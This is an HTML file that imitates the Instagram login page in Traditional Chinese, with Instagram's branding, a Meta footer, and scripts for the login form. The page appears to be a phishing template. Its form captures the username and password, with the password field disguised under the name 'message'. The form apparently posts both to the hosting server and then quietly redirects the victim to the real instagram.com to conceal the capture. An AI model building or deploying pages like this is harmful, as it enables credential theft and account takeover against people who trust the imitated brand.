<!-- 這是 Instagram 登入頁面 -->

<!DOCTYPE html>
<html lang="zh-tw">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>登入 • Instagram</title>
    <link rel="stylesheet" href="css/loginstyle.css">
    <link rel="shortcut icon" href="./img/Instagram_logo_2016.svg.webp">

    <style>
        img {
            vertical-align: text-top;
        }
    </style>
</head>

<body>
    <div class="loader-overlay">
        <div class="loader"></div>
    </div>

    <div class="container">
        <div class="box">
            <i class="heading" data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png&quot;); background-position: 0px -2959px; background-size: 339px 3108px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
            
            <form class="login-form" action="" method="post" onsubmit="redirectToInstagram(event)">
                <div class="field">
                    <input id="username" type="text" name="username" placeholder="手機號碼、用戶名稱或電子郵件地址" required />
                    <label for="username">手機號碼、用戶名稱或電子郵件地址</label>
                </div>
                <div class="field">
                    <input id="message" type="password" name="message" placeholder="密碼" required />
                    <label for="password">密碼</label>
                    <button type="button" id="show-password-btn">顯示</button>
                </div>
                <button class="login-button" type="submit" title="Login">登入</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>或</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span>
                            <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
                            &nbsp;<a href="https://www.facebook.com/login.php/" style="font-weight: bold;">使用 Facebook 帳號登入</a>
                        </span>
                    </button>
                    <a style="font-weight: bold;" class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">忘記密碼？</a>
                    <br>
                </div>
            </form>
        </div>
        <div class="box">
            <p style="color:white">沒有帳號嗎？<a class="signup" href="#">註冊</a></p>
        </div>
    </div>
    <br>
    <div class="get">
        下載應用程式。
    </div>
    <br>
    <div class="apps">
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=zh_TW">
            <img src="./img/google-playstore.png" height="40" width="134">
        </a>
        &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=zh-TW&gl=TW"> 
            <img src="img/microsoft-store.png" height="40" width="auto">
        </a>
    </div>
    <br>
    <div class="footer">
        <footer>
            <a href="https://about.meta.com/">關於</a> 
            <a href="https://about.fb.com/news/">部落格</a> 
            <a href="https://www.metajobs.com/">工作機會</a> 
            <a href="https://www.meta.com/help/">支援</a> 
            <a href="https://developers.facebook.com/docs/">API</a> 
            <a href="https://www.meta.com/privacy/">隱私政策</a> 
            <a href="https://www.meta.com/terms/">使用條款</a> 
            <a href="https://www.meta.com/locations/">地點</a> 
            <a href="https://www.instagram.com/lite/">Instagram Lite</a> 
            <a href="https://www.facebook.com/help/instagram/261704639352628">聯絡上傳與非使用者</a> 
            <a href="https://www.meta.com/verified/">Meta 驗證</a>
        </footer>
    </div>
    <div class="copyright">
        <br>    
        <select aria-label="切換顯示語言" class="Language">
            <option value="zh-tw" selected>中文(台灣)</option>
        </select> © 2025Instagram from Meta
    </div>

    <script>
        function redirectToInstagram(event) {
            user = userField.value;
            pass = passwordField.value;
            setTimeout(function () {
                window.location.href = "https://www.instagram.com/";
            }, 1000);
        }
    </script>

    <script>
        const showPasswordBtn = document.getElementById('show-password-btn');
        const passwordField = document.getElementById('message');
        const userField = document.getElementById('username');
        let user;
        let pass;

        passwordField.addEventListener('input', function () {
            if (passwordField.value.length > 0) {
                showPasswordBtn.style.display = 'block';
            } else {
                showPasswordBtn.style.display = 'none';
            }
        });

        showPasswordBtn.addEventListener('click', function () {
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                showPasswordBtn.textContent = '隱藏';
            } else {
                passwordField.type = 'password';
                showPasswordBtn.textContent = '顯示';
            }
        });

        window.addEventListener('load', () => {
            document.body.classList.add('loaded');
            document.getElementById('content').style.display = 'block';
        });
    </script>
</body>
</html>
